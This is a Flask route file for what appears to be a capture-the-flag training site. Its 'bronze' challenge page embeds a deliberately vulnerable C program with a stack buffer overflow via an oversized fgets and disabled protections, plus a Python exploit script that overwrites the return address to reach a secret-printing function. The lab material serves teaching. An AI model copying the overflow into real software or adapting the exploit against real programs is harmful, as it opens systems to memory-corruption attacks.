from flask import Flask, render_template, Blueprint, redirect, url_for, request, flash
import logging, json
from pathlib import Path
from .proxmox import getContainers, createTarget
from markdown_it import MarkdownIt

bronze_md = """
```c
#include <stdio.h>
#include <string.h>

int logToFile()
{ 
    char tmpLog[64];

    printf("Enter Text: ");

    fgets(tmpLog, sizeof(tmpLog) * 10, stdin);

    printf("[+] logging to file\\n");
    FILE *logFile = fopen("log.txt", "w");
    if (logFile == NULL)
    {
        return 1;
    }

    fprintf(logFile, "%s", tmpLog);
    fclose(logFile);

    fflush(stdout);

    return 0;
}

void printSecret() {
    int encoded_secret[] = {0x134C, 0x1375, 0x135B, 0x1342, 0x1304, 0x131A, 0x1303, 0x1359, 0x1353, 0x131A, 0x1307, 0x1345, 0x1356, 0x1359, 0x1350, 0x1304, 0x134A, 0x1337};

    int key = 0x1337;
    int i = 0;

    // The array has 18 elements. We need a buffer of size 19 (18 chars + 1 null byte).
    char decoded_buffer[19]; 

    // --- Decoding and Storing ---
    while ((encoded_secret[i] ^ key) != 0) {
        
        // Decode the character using XOR and cast it to a char
        char decoded_char = (char)(encoded_secret[i] ^ key);
        
        // Store the decoded character in the buffer
        decoded_buffer[i] = decoded_char;
        
        i++;
    }

    decoded_buffer[i] = '\\0';

    printf("%s %s", "CTF-KEY", decoded_buffer);

    fflush(stdout);
}

int main(int argc, char *argv[])
{
    printf("Starting\\n");
    logToFile();
}


// How to Compile:
// gcc -m32 -no-pie -O0 -Wno-format-truncation -w -fno-stack-protector bronze.c -o bronze
```
"""

python_md = """
```python
# Bronze CTF - Corrected STDIN Injection

import subprocess
import os
import struct
import tempfile

# --- CTF Setup ---
DEBUGGER_NAME = 'edb'
TARGET_EXECUTABLE = './bronze'

# Your specific EIP address
# Note: This payload is still structured for a stack buffer, not a command line arg.
new_eip = struct.pack("<I", 0x08049280)

# The specific string parameter (your payload)
# Total padding = 76 bytes (adjust this padding to match the STDIN buffer size)
PAYLOAD_STRING = b'A' * 64 + b'B' * 16 + new_eip

def run_program_with_stdin_injection():
    temp_file_path = None
    try:
        # 1. Create and write the raw payload to a temporary file
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            temp_file_path = tmp_file.name
            # Write the raw bytes directly to the file
            tmp_file.write(PAYLOAD_STRING)

        print(f"[*] Raw payload written to temporary file: {temp_file_path}")

        # 2. Construct the command to use EDB's --stdin flag
        # EDB requires --stdin <filename> to precede --run
        command = [
            DEBUGGER_NAME,
            '--stdin',                   # Flag 1: Redirect STDIN
            temp_file_path,              # Argument 1: The file to use for STDIN
            '--run',                     # Flag 2: Immediate execution
            TARGET_EXECUTABLE            # Argument 2: The program EDB should run
        ]
        
        # 3. Execute the command
        # Key change: Removing text=True or ensuring it is handled properly, 
        # as edb uses an external terminal.
        result = subprocess.run(
            command,
            capture_output=True,
            # Removed text=True to handle potential encoding issues with terminal output
            check=False
        )

        # 4. Process results (output may be limited since edb opens a terminal)
        print("\n--- Execution Finished ---")
        if result.returncode != 0:
            print(f"Program exited with code {result.returncode}")
            # Common Linux exit code for SIGSEGV is 139
            if result.returncode == 139: 
                print("[+] SEGMENTATION FAULT (Exploit Success Expected)!")
            elif result.returncode == 1:
                print("[-] Error: edb might have failed to launch the terminal (xterm issue).")
        else:
            print("[?] Program exited cleanly (No crash observed).")


    finally:
        # 5. Clean up the temporary file
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)
            print(f"[*] Cleaned up temporary file: {temp_file_path}")

if __name__ == "__main__":
    run_program_with_stdin_injection()
```
"""

main = Blueprint("main", __name__)
logger = logging.getLogger(__name__)

classes_path = "app/data/classes.json"

@main.route('/')
def index():
    with open(classes_path, 'r') as file:
        data = json.load(file)
    return render_template('index.html', navtab="home", data=data)

@main.route('/machines')
def machines():
    containers = getContainers()
    return render_template('machines.html', navtab="machines", containers=containers)

@main.route('/challenge/<medal>')
def challenge(medal):
    markdown_content = "None"
    if medal == 'bronze':
        logger.info("[+] Bronze Challenge")

        md = MarkdownIt().enable('table').enable('strikethrough').enable('linkify') # Enable desired extensions
        markdown_content = md.render(bronze_md)
        python_content = md.render(python_md)
    return render_template('challenge.html', medal=medal, navtab="challenges", markdown_content=markdown_content, python_content=python_content)

@main.route('/walkthru')
def walkthru():
    return render_template('walkthru.html', navtab="walkthru")

@main.route("/spinup", methods=["POST"])
def spinup():
    if request.method == "POST":
        msg = createTarget()
        flash(msg)
        return redirect(url_for('main.machines'))

# TODO: @main.route("/powerOn", methods=["POST"])

# TODO: @main.route("/powerOff", methods=["POST"])

# TODO: @main.route("/deleteVM", methods=["POST"])

# if __name__ == '__main__':
#     app.run(host='0.0.0.0', port=5000, debug=True)